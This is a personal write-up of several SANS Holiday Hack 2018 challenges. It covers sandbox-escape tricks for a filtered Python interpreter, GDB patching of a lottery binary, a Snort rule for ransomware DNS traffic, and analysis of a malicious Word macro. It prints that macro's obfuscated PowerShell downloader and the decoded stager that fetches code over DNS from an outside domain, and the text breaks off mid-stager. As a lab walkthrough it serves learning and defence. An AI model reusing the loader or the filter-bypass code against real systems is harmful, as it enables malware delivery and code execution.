So `SSLKEYLOGFILE` environmental variable is `packalyzer_clientrandom_ssl.log`. Why? Well look at the rest of the file, it's nice and has different words separated by underscores. At the start you have two words mashed together unceremonially, the `http2` is part of the error message.

Actual file points to

`const key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.env.SSLKEYLOGFILE )`

So it's in `https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log`

Now, the trick is to sniff traffic and then quickly get the file. This way we are getting the latest keys and can decrypt traffic as shown in the talk.

To only show data use filter `http2.data.data`.

There does not seem to be a file there but there are username/passwords there. Let's see if we can login as other people and sniff their traffic?

I tried doing another capture and it was the same.

``` json
{"username": "pepper", "password": "Shiz-Bamer_wabl182"}

{"username": "bushy", "password": "Floppity_Floopy-flab19283"}

{"username": "alabaster", "password": "Packer-p@re-turntable192"}
```

Let's login as `alabaster` and do the same.

There's something in his captures, we will download it, refresh the page to get the keys (hopefully they are still the same from the time it was captured) and try decryption. This one is not SSL traffic, we can just read the file.

There's a base64 encoded attachment in the TCP stream, we can copy it to a file an decode it.

Base64 encode decode w/o powershell - **Link to cheatsheet** - anchor does not work, change it in your blog.

```
$ certutil.exe -decode encoded-file.txt decoded-file
Input Length = 132161
Output Length = 97831
CertUtil: -decode command completed successfully.
```

Open it up in hex editor, it's a PDF. Seems like it's about the next challenge.

Name of the song is the answer at the end of the file `Mary Had a Little Lamb`.

```
Hey alabaster, 

Santa said you needed help understanding musical notes for accessing the vault. He said your favorite key was D. Anyways, the following attachment should give you all the information you need about transposing music.
```

## Python Escape from
Escaping from the Python interpreter?

### Talk Notes

* Talk https://www.youtube.com/watch?v=ZVx2Sxl3B9c
* Code: https://gist.github.com/MarkBaggett/dd440362f8a443d644b913acadff9499

#### Overwrite/Reload Python Modules
Overwrite them in memory:

``` python
import sys
sys.modules['os'].system = lamba *x,**y:"STOP HACKING"
del sys

# now if I want to run it
import os
os.system("ls")
# I get stop hacking
'STOP HACKING'
```

To defeat, we can reload them in Python 3 with `importlib`

``` python
import importlib
importlib.reload(os)
```

#### Python as Child Process
Python interpreter is launched as a child process and then keywords are filtered with `readfunc()`.

#### exec
Executes Python code that does not return a result. Break the statements into pieces and run them.

``` python
exec("imp" + "ort os")
os.system("id")
```

#### eval
Executes Python code that returns a result.

``` python
os = eval('__im' + 'port__("os")')  # __import__("os")
os.system("id")
```

#### compile
Takes turns a string into bytecode.

``` python
code = compile("im" + "port os", "", "single") # single means only compile this single line.

# now we need to execute it
# make a function that does nothing
def a():
    return

# and overwrite it
a.__code__ = code

# execute it
a()

# now os should be imported
os.system("id")
```

#### exec, eval, import and compile are blocked
Go to a different Python interpreter, make the function you want

``` python
def bypass():
    import os
    print(os.system("id"))
```

Paste `make_object.py` from https://gist.github.com/MarkBaggett/dd440362f8a443d644b913acadff9499#file-make_object-py this function into the 2nd interpreter:

``` python
import sys
def makeobject(afunction):
   print("Generating a function for version {}.{} (same version as this machine)".format(sys.version_info.major, sys.version_info.minor))
   newstr = ""
   newstr += "def a():\n"
   newstr += "   return\n\n"
   if sys.version_info.major == 2:
       co = afunction.__code__
       if sys.version_info.minor not in [5,6,7]:
           print("This code has not been tested on this version of python.  It may not work.")
       newstr += "a.__code__ = type(a.__code__)({0},{1},{2},{3},'{4}',{5},{6},{7},'{8}','{9}',{10},'{11}')".format( co.co_argcount, co.co_nlocals, co.co_stacksize, co.co_flags, co.co_code.encode("string_escape"),co.co_consts, co.co_names, co.co_varnames, co.co_filename, str(co.co_name), co.co_firstlineno, co.co_lnotab.encode("string_escape"))
   elif sys.version_info.major == 3:
       co = afunction.__code__
       if sys.version_info.minor not in [5]:
           print("This code has not been tested on this version of python.  It may not work.")
       newstr += "a.__code__ = type(a.__code__)({0},{1},{2},{3},{4},{5},{6},{7},{8},'{9}','{10}',{11},{12})".format( co.co_argcount, co.co_kwonlyargcount, co.co_nlocals, co.co_stacksize, co.co_flags, co.co_code,co.co_consts, co.co_names, co.co_varnames, co.co_filename, str(co.co_name), co.co_firstlineno, co.co_lnotab)
   else:
       print("This version of python is not tested and may not work")
   print(newstr)
```

Now call `makeobject(bypass)` to get the bytecode for it. It gives a string that can be copy/pasted into the remote system. It will create a function called `a` and then bytecode for it that does what `bypass` does. Might need to break the keywords into string again (e.g. `"import"` to `"im" + "port"`).

### Challenge

```
I'm another elf in trouble,
Caught within this Python bubble.

Here I clench my merry elf fist -
Words get filtered by a black list!

Can't remember how I got stuck,
Try it - maybe you'll have more luck?

For this challenge, you are more fit.
Beat this challenge - Mark and Bag it!

-SugarPlum Mary

To complete this challenge, escape Python
and run ./i_escaped
```

First let's see what is banned out of those four words. Only `eval` is allowed.

``` python
>>> os = eval('__im' + 'port__("os")') 
>>> os.system("ls")
Use of the command os.system is prohibited for this question.
```

`os.system` is also banned. We need to find another thing in the os module (or any other module) to execute stuff.

`subprocess` is also banned.

``` python
>>> subprocess = eval('__im' + 'port__("subprocess")') 
>>> subprocess.call(["ls"])
Use of the command subprocess. is prohibited for this question.
```

Same with `popen`, seems like they are filtering `open`.

``` python
>>> subprocess.popen
Use of the command open is prohibited for this question.
```

I wonder if we need to use the `make_object` thing.

We are running in `3.5.2`:

``` python
>>> sys = eval('__im' + 'port__("sys")') 
>>> sys.version
'3.5.2 (default, Nov 12 2018, 13:43:14) \n[GCC 5.4.0 20160609]'
```

And we get this

Make sure it's the same version of Python or at least 3.5. Seems like 3.6 does not work.

``` python
def bypass():
    import os
    print(os.system("./i_escaped"))
``` 

To get:

``` python
def a():
   return

a.__code__ = type(a.__code__)(0,0,1,3,67,b'd\x01\x00d\x00\x00l\x00\x00}\x00\x00t\x01\x00|\x00\x00j\x02\x00d\x02\x00\x83\x01\x00\x83\x01\x00\x01d\x00\x00S',(None, 0, './i_escaped'),('os', 'print', 'system'),('os',),'<stdin>','bypass',1,b'\x00\x01\x0c\x01')
```

And it works:

```
Loading, please wait......
 
  ____        _   _                      
 |  _ \ _   _| |_| |__   ___  _ __       
 | |_) | | | | __| '_ \ / _ \| '_ \      
 |  __/| |_| | |_| | | | (_) | | | |     
 |_|___ \__, |\__|_| |_|\___/|_| |_| _ _ 
 | ____||___/___ __ _ _ __   ___  __| | |
 |  _| / __|/ __/ _` | '_ \ / _ \/ _` | |
 | |___\__ \ (_| (_| | |_) |  __/ (_| |_|
 |_____|___/\___\__,_| .__/ \___|\__,_(_)
                     |_|                             
That's some fancy Python hacking -
You have sent that lizard packing!
-SugarPlum Mary
            
You escaped! Congratulations!
0
```

Hint is:

```
Yay, you did it! You escaped from the Python!

As a token of my gratitude, I would like to share a rumor I had heard about Santa's new web-based packet analyzer - Packalyzer.

Another elf told me that Packalyzer was rushed and deployed with development code sitting in the web root.

https://packalyzer.kringlecastle.com/

Apparently, he found this out by looking at HTML comments left behind and was able to grab the server-side source code.

There was suspicious-looking development code using environment variables to store SSL keys and open up directories.

This elf then told me that manipulating values in the URL gave back weird and descriptive errors.

I'm hoping these errors can't be used to compromise SSL on the website and steal logins.

On a tooootally unrelated note, have you seen the HTTP2 talk at at KringleCon by the Chrises? I never knew HTTP2 was so different!

Oh my! Santa’s castle… it’s under siege!
```

-----

# 9. Ransomware Recovery
Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks. For hints on achieving this objective, please visit Shinny Upatree and help him with the Sleigh Bell Lottery Cranberry Pi terminal challenge.

## The Sleighball
Seems like it's an RE challenge because it talks about GDB and PEDA.

Complete this challenge by winning the sleighbell lottery for Shinny Upatree.

```
$ ls
gdb  objdump  sleighbell-lotto
elf@523afd1c9082:~$ file sleighbell-lotto 
sleighbell-lotto: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically link
ed, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=4f713b9618
45b98512a7d8df8692317317d5dfb8, not stripped
```

`not stripped` means debug symbols? Probably. Woot.

Fortunately it's only 38K so it's a pretty small binary.

Running it manually

```
$ ./sleighbell-lotto 

The winning ticket is number 1225.
Rolling the tumblers to see what number you'll draw...

You drew ticket number 4965!

Sorry - better luck next year!
```

The winning number seems to be `1225` all the time.

`objdump -M intel -D sleighbell-lotto > dump1`

`1225` is `04 C9` cannot find it in the objdump.

Symbol table

```
elf@bb1fdf8aa3c0:~$ objdump --syms sleighbell-lotto 

sleighbell-lotto:     file format elf64-x86-64

SYMBOL TABLE:
0000000000000238 l    d  .interp        0000000000000000              .interp
0000000000000254 l    d  .note.ABI-tag  0000000000000000              .note.ABI-tag
0000000000000274 l    d  .note.gnu.build-id     0000000000000000              .note.gnu.build-id
0000000000000298 l    d  .gnu.hash      0000000000000000              .gnu.hash
00000000000002b8 l    d  .dynsym        0000000000000000              .dynsym
00000000000004c8 l    d  .dynstr        0000000000000000              .dynstr
00000000000005e4 l    d  .gnu.version   0000000000000000              .gnu.version
0000000000000610 l    d  .gnu.version_r 0000000000000000              .gnu.version_r
0000000000000670 l    d  .rela.dyn      0000000000000000              .rela.dyn
0000000000000748 l    d  .rela.plt      0000000000000000              .rela.plt
00000000000008c8 l    d  .init  0000000000000000              .init
00000000000008e0 l    d  .plt   0000000000000000              .plt
00000000000009f0 l    d  .plt.got       0000000000000000              .plt.got
0000000000000a00 l    d  .text  0000000000000000              .text
0000000000001624 l    d  .fini  0000000000000000              .fini
0000000000001630 l    d  .rodata        0000000000000000              .rodata
0000000000006dcc l    d  .eh_frame_hdr  0000000000000000              .eh_frame_hdr
0000000000006e40 l    d  .eh_frame      0000000000000000              .eh_frame
0000000000207d30 l    d  .init_array    0000000000000000              .init_array
0000000000207d38 l    d  .fini_array    0000000000000000              .fini_array
0000000000207d40 l    d  .dynamic       0000000000000000              .dynamic
0000000000207f40 l    d  .got   0000000000000000              .got
0000000000208000 l    d  .data  0000000000000000              .data
0000000000208068 l    d  .bss   0000000000000000              .bss
0000000000000000 l    d  .comment       0000000000000000              .comment
0000000000000000 l    df *ABS*  0000000000000000              crtstuff.c
0000000000000a30 l     F .text  0000000000000000              deregister_tm_clones
0000000000000a70 l     F .text  0000000000000000              register_tm_clones
0000000000000ac0 l     F .text  0000000000000000              __do_global_dtors_aux
0000000000208068 l     O .bss   0000000000000001              completed.7696
0000000000207d38 l     O .fini_array    0000000000000000              __do_global_dtors_aux_fini_array_entry
0000000000000b00 l     F .text  0000000000000000              frame_dummy
0000000000207d30 l     O .init_array    0000000000000000              __frame_dummy_init_array_entry
0000000000000000 l    df *ABS*  0000000000000000              hmac_sha256.c
0000000000000000 l    df *ABS*  0000000000000000              sleigh-bell-lotto.c
0000000000208020 l     O .data  0000000000000040              encoding_table
0000000000208078 l     O .bss   0000000000000008              decoding_table
0000000000000000 l    df *ABS*  0000000000000000              crtstuff.c
000000000000702c l     O .eh_frame      0000000000000000              __FRAME_END__
0000000000000000 l    df *ABS*  0000000000000000              
0000000000006dcc l       .eh_frame_hdr  0000000000000000              __GNU_EH_FRAME_HDR
0000000000207f40 l     O .got   0000000000000000              _GLOBAL_OFFSET_TABLE_
0000000000207d38 l       .init_array    0000000000000000              __init_array_end
0000000000207d30 l       .init_array    0000000000000000              __init_array_start
0000000000207d40 l     O .dynamic       0000000000000000              _DYNAMIC
0000000000208000  w      .data  0000000000000000              data_start
0000000000000000       F *UND*  0000000000000000              printf@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              memset@@GLIBC_2.2.5
0000000000001620 g     F .text  0000000000000002              __libc_csu_fini
0000000000000a00 g     F .text  000000000000002b              _start
0000000000000000  w      *UND*  0000000000000000              __gmon_start__
0000000000000000       F *UND*  0000000000000000              puts@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              exit@@GLIBC_2.2.5
0000000000001624 g     F .fini  0000000000000000              _fini
0000000000000f18 g     F .text  00000000000000bf              tohex
0000000000208060 g     O .data  0000000000000008              winnermsg
0000000000000000       F *UND*  0000000000000000              malloc@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              __libc_start_main@@GLIBC_2.2
.5
0000000000000fd7 g     F .text  00000000000004e0              winnerwinner
0000000000000b0a g     F .text  00000000000000c2              hmac_sha256
0000000000208070 g     O .bss   0000000000000008              decoded_data
0000000000000000  w      *UND*  0000000000000000              _ITM_deregisterTMCloneTable
0000000000001630 g     O .rodata        0000000000000004              _IO_stdin_used
0000000000000000       F *UND*  0000000000000000              free@@GLIBC_2.2.5
0000000000000000       F *UND*  0000000000000000              strlen@@GLIBC_2.2.5
0000000000000000  w      *UND*  0000000000000000              _ITM_registerTMCloneTable
0000000000208000 g       .data  0000000000000000              __data_start
0000000000000000  w    F *UND*  0000000000000000              __cxa_finalize@@GLIBC_2.2.5
0000000000000c43 g     F .text  00000000000002d5              base64_decode
0000000000000000       F *UND*  0000000000000000              sleep@@GLIBC_2.2.5
0000000000208068 g     O .data  0000000000000000              .hidden __TMC_END__
0000000000208008 g     O .data  0000000000000000              .hidden __dso_handle
00000000000015b0 g     F .text  0000000000000065              __libc_csu_init
0000000000000000       F *UND*  0000000000000000              getenv@@GLIBC_2.2.5
0000000000208068 g       .bss   0000000000000000              __bss_start
0000000000000000       F *UND*  0000000000000000              __stack_chk_fail@@GLIBC_2.4
0000000000000000       F *UND*  0000000000000000              HMAC@@OPENSSL_1_1_0
0000000000000000       F *UND*  0000000000000000              srand@@GLIBC_2.2.5
0000000000208080 g       .bss   0000000000000000              _end
0000000000000c1e g     F .text  0000000000000025              base64_cleanup
00000000000014b7 g     F .text  0000000000000013              sorry
0000000000000bcc g     F .text  0000000000000052              build_decoding_table
0000000000000000       F *UND*  0000000000000000              EVP_sha256@@OPENSSL_1_1_0
0000000000000000       F *UND*  0000000000000000              rand@@GLIBC_2.2.5
0000000000208068 g       .data  0000000000000000              _edata
0000000000000000       F *UND*  0000000000000000              memcpy@@GLIBC_2.14
0000000000000000       F *UND*  0000000000000000              time@@GLIBC_2.2.5
00000000000014ca g     F .text  00000000000000e1              main
00000000000008c8 g     F .init  0000000000000000              _init
```

`break main` and `set disassembly-flavor intel`

Then `disass` on main.

```
   0x00005555555554ca <+0>:     push   rbp
   0x00005555555554cb <+1>:     mov    rbp,rsp
=> 0x00005555555554ce <+4>:     sub    rsp,0x10
   0x00005555555554d2 <+8>:     lea    rdi,[rip+0x56d6]        # 0x55555555abaf
   0x00005555555554d9 <+15>:    call   0x555555554970 <getenv@plt>
   0x00005555555554de <+20>:    test   rax,rax
   0x00005555555554e1 <+23>:    jne    0x5555555554f9 <main+47>
   0x00005555555554e3 <+25>:    lea    rdi,[rip+0x56d6]        # 0x55555555abc0
   0x00005555555554ea <+32>:    call   0x555555554910 <puts@plt>
   0x00005555555554ef <+37>:    mov    edi,0xffffffff
   0x00005555555554f4 <+42>:    call   0x555555554920 <exit@plt>
   0x00005555555554f9 <+47>:    mov    edi,0x0
   0x00005555555554fe <+52>:    call   0x5555555549e0 <time@plt>
   0x0000555555555503 <+57>:    mov    edi,eax
   0x0000555555555505 <+59>:    call   0x5555555549a0 <srand@plt>
   0x000055555555550a <+64>:    lea    rdi,[rip+0x583f]        # 0x55555555ad50
   0x0000555555555511 <+71>:    call   0x555555554910 <puts@plt>
   0x0000555555555516 <+76>:    mov    edi,0x1
   0x000055555555551b <+81>:    call   0x555555554960 <sleep@plt>
   0x0000555555555520 <+86>:    call   0x5555555549c0 <rand@plt>
   0x0000555555555525 <+91>:    mov    ecx,eax
   0x0000555555555527 <+93>:    mov    edx,0x68db8bad
   0x000055555555552c <+98>:    mov    eax,ecx
   0x000055555555552e <+100>:   imul   edx
   0x0000555555555530 <+102>:   sar    edx,0xc
   0x0000555555555533 <+105>:   mov    eax,ecx
   0x0000555555555535 <+107>:   sar    eax,0x1f
   0x0000555555555538 <+110>:   sub    edx,eax
   0x000055555555553a <+112>:   mov    eax,edx
   0x000055555555553c <+114>:   mov    DWORD PTR [rbp-0x4],eax
   0x000055555555553f <+117>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000555555555542 <+120>:   imul   eax,eax,0x2710
   0x0000555555555548 <+126>:   sub    ecx,eax
   0x000055555555554a <+128>:   mov    eax,ecx
   0x000055555555554c <+130>:   mov    DWORD PTR [rbp-0x4],eax
   0x000055555555554f <+133>:   lea    rdi,[rip+0x5856]        # 0x55555555adac
   0x0000555555555556 <+140>:   mov    eax,0x0
   0x000055555555555b <+145>:   call   0x5555555548f0 <printf@plt>
   0x0000555555555560 <+150>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000555555555563 <+153>:   mov    esi,eax
   0x0000555555555565 <+155>:   lea    rdi,[rip+0x5858]        # 0x55555555adc4
   0x000055555555556c <+162>:   mov    eax,0x0
   0x0000555555555571 <+167>:   call   0x5555555548f0 <printf@plt>
   0x0000555555555576 <+172>:   lea    rdi,[rip+0x584a]        # 0x55555555adc7
   0x000055555555557d <+179>:   call   0x555555554910 <puts@plt>
   0x0000555555555582 <+184>:   cmp    DWORD PTR [rbp-0x4],0x4c9
   0x0000555555555589 <+191>:   jne    0x555555555597 <main+205>
   0x000055555555558b <+193>:   mov    eax,0x0
   0x0000555555555590 <+198>:   call   0x555555554fd7 <winnerwinner>
   0x0000555555555595 <+203>:   jmp    0x5555555555a1 <main+215>
   0x0000555555555597 <+205>:   mov    eax,0x0
   0x000055555555559c <+210>:   call   0x5555555554b7 <sorry>
   0x00005555555555a1 <+215>:   mov    edi,0x0
   0x00005555555555a6 <+220>:   call   0x555555554920 <exit@plt>
```

Something is pushed to `rdi` and then `getenv` is called. We can break on the `call getenv` line and read the contents of `rdi`.

```
(gdb) x/s $rdi
0x55555555abaf: "RESOURCE_ID"
```

So it's reading `RESOURCE_ID` from environmental variables and if it's not zero (see `test rax rax`) it jumps to `main+47`

`si` steps in and `ni` steps over for assembly instructions.

Result is 

```
(gdb) x/s $rax
0x7fffffffe951: "7a29a437-8523-4513-828e-53394fa647a4"
```

Might be an environment thing because if it's zero, the program exits.

edi is set to zero and then `time` is called. Which gets the time.

`ni` to step over it. After the function call `rax` has the current time:

`rax            0x5c28c70b       1546176267`

`edi` now has the time.

`srand(time)` calls srand and seeds it with current time.

Before `puts` we can see `rdi` and see it always prints the following text.

```
(gdb) x/s $rdi
0x55555555ad50: "\nThe winning ticket is number 1225.\nRolling the tumblers to see what nu
mber you'll draw...\n"
```

So winning number is either always `1225` or it's just bogus.

Then it sleeps for a second (see `sleep`).

Then calls `rand` and then does a bunch of stuff.

Long story short, the result of calculation ends up in `eax` and stored in memory.

```
   0x000055555555554c <+130>:   mov    DWORD PTR [rbp-0x4],eax
```

Set a breakpoint here and change the value to `0x04C9`

```
break *0x000055555555554c
c # continue
set $rax = 0x4c9
c # continue
```

And we're done.

```
(gdb) set $rax = 0x4c9
(gdb) c
Continuing.
You drew ticket number 1225!
                                                                                
                                                     .....          ......      
                                     ..,;:::::cccodkkkkkkkkkxdc;.   .......     
                             .';:codkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx.........    
                         ':okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx..........   
                     .;okkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkdc..........   
                  .:xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkko;.     ........   
                'lkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx:.          ......    
              ;xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkd'                       
            .xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                         
           .kkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx'                           
           xkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkx;                             
          :olodxkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkkk;                               
       ..........;;;;coxkkkkkkkkkkkkkkkkkkkkkkc                                 
     ...................,',,:lxkkkkkkkkkkkkkd.                                  
     ..........................';;:coxkkkkk:                                    
        ...............................ckd.                                     
          ...............................                                       
                ...........................                                     
                   .......................                                      
                              ....... ...                                       
With gdb you fixed the race.
The other elves we did out-pace.
  And now they'll see.
  They'll all watch me.
I'll hang the bells on Santa's sleigh!
Congratulations! You've won, and have successfully completed this challenge.
```

**We could have also directly jumped to winnerwinner I guess, but this was more fun.**

Hint is

```
Sweet candy goodness - I win! Thank you so much!

Have you heard that Kringle Castle was hit by a new ransomware called Wannacookie?

Several elves reported receiving a cookie recipe Word doc. When opened, a PowerShell screen flashed by and their files were encrypted.

Many elves were affected, so Alabaster went to go see if he could help out.

I hope Alabaster watched the PowerShell Malware talk at KringleCon before he tried analyzing Wannacookie on his computer.
```

```
Alabaster Snowball3:54AM
Help, all of our computers have been encrypted by ransomware!

I came here to help but got locked in 'cause I dropped my "Alabaster Snowball" badge in a rush.

I started analyzing the ransomware on my host operating system, ran it by accident, and now my files are encrypted!

Unfortunately, the password database I keep on my computer was encrypted, so now I don't have access to any of our systems.

If only there were some way I could create some kind of traffic filter that could alert anytime ransomware was found!
```

## 9.1 Catch the Malware
Assist Alabaster by building a Snort filter to identify the malware plaguing Santa's Castle.

So it seems the original malware was received in a word doc.

```
INTRO:
  Kringle Castle is currently under attacked by new piece of
  ransomware that is encrypting all the elves files. Your 
  job is to configure snort to alert on ONLY the bad 
  ransomware traffic.
GOAL:
  Create a snort rule that will alert ONLY on bad ransomware
  traffic by adding it to snorts /etc/snort/rules/local.rules
  file. DNS traffic is constantly updated to snort.log.pcap
COMPLETION:
  Successfully create a snort rule that matches ONLY
  bad DNS traffic and NOT legitimate user traffic and the 
  system will notify you of your success.
  
  Check out ~/more_info.txt for additional information.
```

```
elf@d7bf3c3316f3:~$ cat ~/more_info.txt 
MORE INFO:
  A full capture of DNS traffic for the last 30 seconds is 
  constantly updated to:
  /home/elf/snort.log.pcap
  You can also test your snort rule by running:
  snort -A fast -r ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf
  This will create an alert file at ~/snort_logs/alert
  This sensor also hosts an nginx web server to access the 
  last 5 minutes worth of pcaps for offline analysis. These 
  can be viewed by logging into:
  http://snortsensor1.kringlecastle.com/
  Using the credentials:
  ----------------------
  Username | elf
  Password | onashelf
  tshark and tcpdump have also been provided on this sensor.
HINT: 
  Malware authors often user dynamic domain names and 
  IP addresses that change frequently within minutes or even 
  seconds to make detecting and block malware more difficult.
  As such, its a good idea to analyze traffic to find patterns
  and match upon these patterns instead of just IP/domains
```

Looking at pcap files in the portal we can see some of the traffic that looks like malware traffic.

```
77616E6E61636F6F6B69652E6D696E2E707331.rahbegunsr.net

77616E6E61636F6F6B69652E6D696E2E707331.baehnrusrg.com

12.77616E6E61636F6F6B69652E6D696E2E707331.rahbegunsr.net

16.77616E6E61636F6F6B69652E6D696E2E707331.baehnrusrg.com

1.77616E6E61636F6F6B69652E6D696E2E707331.hngaerrbus.org
```

Seems like all of them have `77616E6E61636F6F6B69652E6D696E2E707331` in them.

Now we need to see how we can make snort rules.

outgoing and incoming

```
alert udp any any -> any 53 (msg:"malware DNS request"; sid:10000001; content:"77616E6E61636F6F6B69652E6D696E2E707331";)
alert udp any 53 -> any any (msg:"malware DNS response";sid:10000002; content:"77616E6E61636F6F6B69652E6D696E2E707331";)
```

If payload had binary in it, we had to put them in hex between pipes like `| 4D BA |`.

Woot

```
[+] Congratulation! Snort is alerting on all ransomware and only the ransomware! 
[+]  
```

## 9.2 Identify the Domain
There's a zip file with a `docm` in it. Password is `elves`.

https://www.holidayhackchallenge.com/2018/challenges/CHOCOLATE_CHIP_COOKIE_RECIPE.zip

We have already seen the domain in Wireshark, it's `erohetfanu.com`.

Nevertheless you can figure it out in a different ways.

**This is a nice trick.**

What I did was the lazy way. Instead of procmon, I cleared the Windows DNS cache, ran the malware and then exported it. Saw which new domain has been added that is not one of the hardcoded Microsoft ones and got the answer.

After downloading it, Windows defender goes haywire.

```
Trojan:Win32/Occamy.C

file: C:\Users\IEUser\Desktop\9-2-malware-docm\CHOCOLATE_CHIP_COOKIE_RECIPE.docm->word/vbaProject.bin
```

We are not opening it, I do not even have Word on this VM so we will `Allow on Device`.

`docx` files are zip files, we can extract them with 7-zip.

In `[Content_Types].xml` file we can see the `vba` file.

``` xml
<Override PartName="/word/vbaData.xml" ContentType="application/vnd.ms-word.vbaData+xml"/>
```

Then we can open `/word/vbaData.xml`:

``` xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<wne:vbaSuppData
	xmlns:ve="http://schemas.openxmlformats.org/markup-compatibility/2006"
	xmlns:o="urn:schemas-microsoft-com:office:office"
	xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
	xmlns:m="http://schemas.openxmlformats.org/officeDocument/2006/math"
	xmlns:v="urn:schemas-microsoft-com:vml"
	xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"
	xmlns:w10="urn:schemas-microsoft-com:office:word"
	xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
	xmlns:wne="http://schemas.microsoft.com/office/word/2006/wordml">
	<wne:mcds>
		<wne:mcd wne:macroName="PROJECT.NEWMACROS.AUTOOPEN" wne:name="Project.NewMacros.AutoOpen" wne:bEncrypt="00" wne:cmg="56"/>
	</wne:mcds>
</wne:vbaSuppData>
```

`Autoopen` and stuff.

Windows defender had deleted the actual payload, it's in `vbaProject.bin`.

Now we can run `olevba` on it to get the macro. Seems like there are two macros with the same content.

``` vb
olevba 0.53.1 - http://decalage.info/python/oletools
Flags        Filename
-----------  -----------------------------------------------------------------
OpX:MASI---- CHOCOLATE_CHIP_COOKIE_RECIPE.docm
===============================================================================
FILE: CHOCOLATE_CHIP_COOKIE_RECIPE.docm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: u'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas
in file: word/vbaProject.bin - OLE stream: u'VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Private Sub Document_Open()
Dim cmd As String
cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
Shell cmd
End Sub

-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas
in file: word/vbaProject.bin - OLE stream: u'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub AutoOpen()
Dim cmd As String
cmd = "powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C ""sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String('lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG'),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd()"" "
Shell cmd
End Sub

+------------+-----------------+-----------------------------------------+
| Type       | Keyword         | Description                             |
+------------+-----------------+-----------------------------------------+
| AutoExec   | AutoOpen        | Runs when the Word document is opened   |
| AutoExec   | Document_Open   | Runs when the Word or Publisher         |
|            |                 | document is opened                      |
| Suspicious | Shell           | May run an executable file or a system  |
|            |                 | command                                 |
| Suspicious | powershell      | May run PowerShell commands             |
| Suspicious | ExecutionPolicy | May run PowerShell commands             |
| Suspicious | New-Object      | May create an OLE object using          |
|            |                 | PowerShell                              |
| IOC        | powershell.exe  | Executable file name                    |
+------------+-----------------+-----------------------------------------+
```

Seems like the Powershell payload is base64 encoded and then compressed.

Cyberchef to the rescuce.

```
From_Base64('A-Za-z0-9+/=',true)
Raw_Inflate(0,0,'Adaptive',false,false)
Generic_Code_Beautify()
```

And we get

``` powershell
function H2A($a) {
    $o;
    $a  - split '(..)' | ? {
        $_ 
    }

    | forEach {
        [char]([convert]::toint16($_, 16))
    }

    | forEach {
        $o = $o  +  $_
    };
    return $o
};
$f = "77616E6E61636F6F6B69652E6D696E2E707331";
$h = "";
foreach ($i in 0..([convert]::ToInt32((Resolve - DnsName  - Server erohetfanu.com  - Name "$f.erohetfanu.com"  - Type TXT).strings, 10) - 1)) {
